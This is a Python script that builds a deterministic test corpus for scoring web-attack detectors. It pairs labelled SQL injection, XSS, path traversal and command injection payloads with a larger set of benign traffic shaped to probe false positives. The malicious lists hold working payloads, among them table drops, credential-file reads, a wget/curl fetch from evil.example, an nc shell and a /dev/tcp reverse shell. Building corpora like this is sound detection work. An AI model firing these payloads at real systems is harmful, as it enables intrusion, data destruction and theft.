#!/usr/bin/env python3
"""Generate the frozen Spike C corpus.

Deterministic by construction: no randomness, no timestamps, no network. Running
this twice produces byte-identical files, which is what makes MANIFEST.sha256 a
meaningful freeze rather than a snapshot of one lucky run.

Per-category minimums: sqli 50, xss 50, traversal 30,
cmdi 30, benign 500. The benign set must dominate, because that is the real
traffic ratio and it is the set that decides whether a false-positive rate is
tolerable.

One file per case: `<name>.txt` holding the raw field value under test. The
runner scores each file against every detector, so a payload's directory says
what it *is*, not which detector should fire.
"""

import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parent / "corpus"


def write(rel: str, cases: list[str]) -> int:
    d = ROOT / rel
    d.mkdir(parents=True, exist_ok=True)
    for old in d.glob("*.txt"):
        old.unlink()
    for i, case in enumerate(cases, 1):
        (d / f"{i:03d}.txt").write_text(case, encoding="utf-8")
    return len(cases)


SQLI = [
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "admin'--",
    "' UNION SELECT username, password FROM users --",
    "1 UNION ALL SELECT NULL, NULL, NULL",
    "' UNION SELECT 1,2,3,4,5 --",
    "1; DROP TABLE users",
    "'; DROP DATABASE production; --",
    "1); DELETE FROM orders WHERE 1=1 --",
    "'; INSERT INTO admins (user) VALUES ('x'); --",
    "1' AND 1=1 --",
    "1' AND 2=2 --",
    "' OR 1=1",
    "' OR 7=7 #",
    "x' AND 1=0 UNION SELECT table_name FROM information_schema.tables --",
    "1 AND (SELECT COUNT(*) FROM users) > 0",
    "' AND SLEEP(5) --",
    "1' AND BENCHMARK(10000000, MD5('a')) --",
    "'; WAITFOR DELAY '0:0:10' --",
    "1 OR SLEEP(3)",
    "'; EXEC xp_cmdshell('dir'); --",
    "'; EXEC sp_configure 'show advanced', 1 --",
    "1'; EXECUTE IMMEDIATE 'DROP TABLE t' --",
    "' UPDATE users SET role='admin' WHERE id=1 --",
    "1; UPDATE accounts SET balance=999999 SET x=1",
    "' OR EXISTS(SELECT * FROM users) --",
    "0x414243",
    "SELECT 0xdeadbeef FROM dual",
    "' OR 0x31=0x31 --",
    "1 UNION SELECT 0x62696e",
    "SELECT * FROM users WHERE id = 1",
    "DELETE FROM sessions WHERE expired = 1",
    "INSERT INTO log INTO x",
    "DROP TABLE temp_data",
    "DROP DATABASE staging",
    "1'; SELECT pg_sleep(5); --",
    "'||(SELECT version())||'",
    "' AND ASCII(SUBSTRING((SELECT name FROM users LIMIT 1),1,1))>64 --",
    "1' ORDER BY 9 --",
    "1' GROUP BY 1,2,3 HAVING 1=1 --",
    "%27%20OR%20%271%27%3D%271",
    "' oR '1'='1",
    "' Or 1 = 1 --",
    "'/**/OR/**/1=1--",
    "1'%09OR%091=1",
    "'; SHUTDOWN; --",
    "' AND 1=CONVERT(int,(SELECT @@version)) --",
    "1' AND (SELECT SUBSTRING(password,1,1) FROM users)='a' --",
    "'; TRUNCATE TABLE audit_log; --",
    "' UNION SELECT NULL, LOAD_FILE('/etc/passwd') --",
    "1' AND updatexml(1,concat(0x7e,version()),1) --",
    "' AND extractvalue(1,concat(0x5c,user())) --",
]

XSS = [
    "<script>alert(1)</script>",
    "<script >alert('xss')</script>",
    "<SCRIPT>alert(document.cookie)</SCRIPT>",
    "<script src='//evil.example/x.js'></script>",
    "</script><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src='x' onerror='alert(document.domain)'>",
    "<img/src=x/onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<object data='javascript:alert(1)'></object>",
    "<embed src='//evil.example/x.swf'>",
    "javascript:alert(1)",
    "javascript: void(0)",
    "JaVaScRiPt:alert(1)",
    "onmouseover=alert(1)",
    "onfocus=alert(1) autofocus",
    "onclick=alert(1)",
    " onerror = alert(1)",
    "<a href='javascript:x'>click</a>",
    "eval('alert(1)')",
    "eval  (atob('YWxlcnQoMSk='))",
    "alert(1)",
    "alert  ('x')",
    "expression(alert(1))",
    "width: expression(alert(1))",
    "<div style='width:expression(alert(1))'>",
    "<input onfocus=alert(1) autofocus>",
    "<select onchange=alert(1)>",
    "<textarea onblur=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<details ontoggle=alert(1)>",
    "<video onerror=alert(1)><source>",
    "<audio src=x onerror=alert(1)>",
    "<form onsubmit=alert(1)>",
    "<button onclick=alert(1)>x</button>",
    "<link rel=import href='//evil.example'>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script\\x20type='text/javascript'>alert(1)</script>",
    "<script\\x0Atype='text/javascript'>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<style>@import 'javascript:alert(1)';</style>",
    "<base href='javascript:'>",
    "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
]

TRAVERSAL = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../../../etc/shadow",
    "..\\windows\\system32\\config\\sam",
    "..\\..\\boot.ini",
    "..%2fetc%2fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%5cwindows%5cwin.ini",
    "%2e%2e%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fshadow",
    "%2e%2e/etc/passwd",
    "%2e%2e%5cboot.ini",
    "%2e%2e\\windows\\win.ini",
    "%252e%252e%252fetc%252fpasswd",
    "%252e%252e/etc/passwd",
    "%c0%ae%c0%ae/etc/passwd",
    "%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
    "....//etc/passwd",
    "..././etc/passwd",
    "/var/www/../../etc/passwd",
    "images/../../../etc/passwd",
    "./../../etc/hosts",
    "../.ssh/id_rsa",
    "../../.env",
    "../../../proc/self/environ",
    "..%00/etc/passwd",
    "../etc/passwd%00.png",
    "..//..//..//etc//passwd",
    "..\\/..\\/etc/passwd",
    "%2E%2E%2Fetc%2Fpasswd",
    "..%c1%9cwindows",
]

CMDI = [
    "; ls -la",
    "; cat /etc/passwd",
    "; rm -rf /tmp/x",
    "| ls",
    "| cat /etc/shadow",
    "| whoami",
    "|| id",
    "|| curl http://evil.example",
    "&& ls -la",
    "&& wget http://evil.example/x.sh",
    "&& cat /etc/hosts",
    "\n ls",
    "\n cat /etc/passwd",
    "$(whoami)",
    "$( id )",
    "$(cat /etc/passwd)",
    "`id`",
    "`cat /etc/passwd`",
    "`uname -a`",
    "${IFS}ls",
    "${PATH}",
    "> /tmp/pwned",
    ">> /etc/crontab",
    "< /etc/passwd",
    "2>&1",
    "ls 2>&1",
    "; ping -c 10 127.0.0.1",
    "; nc -e /bin/sh 10.0.0.1 4444",
    "; python3 -c 'import os; os.system(\"id\")'",
    "; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
    "%3B%20ls",
    "%0Acat%20/etc/passwd",
]


def benign() -> list[str]:
    """Realistic traffic that must NOT trip a detector.

    Weighted toward the shapes known to produce false positives
    sources: hex strings (the `0x[0-9a-f]{2,}` pattern), trailing double
    dashes (`--[^\\r\\n]*$`), and ordinary prose containing SQL keywords.
    """
    out: list[str] = []

    # CSS hex colours — trip `(?i)0x...`? No, but `#rrggbb` is adjacent noise,
    # and the `0x` form appears in real CSS-in-JS and design tokens.
    for i in range(40):
        out.append(f"color: #{i:02x}{(i * 3) % 256:02x}{(i * 7) % 256:02x};")
    for i in range(30):
        out.append(f"0x{i:06x}")

    # Git SHAs and ETags — the canonical `0x`-adjacent false positive source.
    for i in range(45):
        h = f"{i:040x}"
        out.append(h)
    for i in range(25):
        out.append(f'W/"{i:032x}"')

    # UUIDs and JWT-shaped tokens.
    for i in range(40):
        out.append(
            f"{i:08x}-{i:04x}-4{i:03x}-8{i:03x}-{i:012x}"
        )
    for i in range(20):
        out.append(
            "eyJhbGciOiJIUzI1NiJ9."
            f"eyJzdWIiOiJ1c2VyLXt7{i:04d}fX0ifQ."
            f"c2lnbmF0dXJlLXt7{i:04d}fX0"
        )

    # Trailing double dashes in ordinary content — `--[^\r\n]*$`.
    prose_dashes = [
        "The report was inconclusive -- see appendix B for details",
        "Pending review -- assigned to the platform team",
        "em-dash usage -- common in editorial copy",
        "config value -- overridden at runtime",
        "deprecated -- use the v2 endpoint instead",
    ]
    for i in range(35):
        out.append(prose_dashes[i % len(prose_dashes)] + f" ({i})")

    # CLI-style flags, which legitimately contain `--`.
    flags = [
        "--verbose --output=json",
        "npm run build -- --mode=production",
        "cargo test -- --nocapture",
        "git log --oneline --decorate",
        "curl --silent --location",
    ]
    for i in range(30):
        out.append(flags[i % len(flags)] + f" # run {i}")

    # Prose containing SQL keywords without being SQL.
    sql_words = [
        "Please select from the following options",
        "We will update our terms and conditions",
        "Delete from your cart before checkout",
        "Insert into the slot at the top of the device",
        "The union representative and select committee met",
        "Drop the table linens off at the cleaners",
        "Order by preference, then by price",
        "Group by department for the quarterly review",
    ]
    for i in range(60):
        out.append(sql_words[i % len(sql_words)] + f" — item {i}")

    # JSON bodies, base64 blobs, query strings with encoded punctuation.
    for i in range(40):
        out.append(
            '{"id":%d,"name":"widget-%d","tags":["a","b"],"active":true}' % (i, i)
        )
    for i in range(30):
        out.append(
            "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8"
            f"{i:04d}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        )
    for i in range(35):
        out.append(
            f"q=search%20term%20{i}&sort=created_at%3Adesc&page={i}&limit=50"
        )

    # File paths and URLs with dots that are not traversal.
    for i in range(30):
        out.append(f"/assets/js/vendor.{i:04x}.chunk.js")
    for i in range(20):
        out.append(f"https://cdn.example.com/v2/images/photo.{i}.webp?w=800")

    # Ordinary user agents and content types (headers the SAFE_HEADERS set skips,
    # included so the runner can show what skipping actually hides).
    uas = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
        "curl/8.7.1",
        "python-requests/2.32.3",
        "Go-http-client/2.0",
    ]
    for i in range(25):
        out.append(uas[i % len(uas)])

    # Semicolons and pipes in legitimate values — the cmdi pattern `;\s*\w`.
    for i in range(35):
        out.append(f"text/html; charset=utf-8; boundary=part{i}")
    for i in range(20):
        out.append(f"a|b|c|record{i}")

    return out


def main() -> int:
    counts = {
        "malicious/sqli": write("malicious/sqli", SQLI),
        "malicious/xss": write("malicious/xss", XSS),
        "malicious/traversal": write("malicious/traversal", TRAVERSAL),
        "malicious/cmdi": write("malicious/cmdi", CMDI),
        "benign": write("benign", benign()),
    }
    minimums = {
        "malicious/sqli": 50,
        "malicious/xss": 50,
        "malicious/traversal": 30,
        "malicious/cmdi": 30,
        "benign": 500,
    }
    ok = True
    for name, n in counts.items():
        need = minimums[name]
        mark = "ok" if n >= need else "UNDER MINIMUM"
        if n < need:
            ok = False
        print(f"  {name:22s} {n:5d}  (min {need})  {mark}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
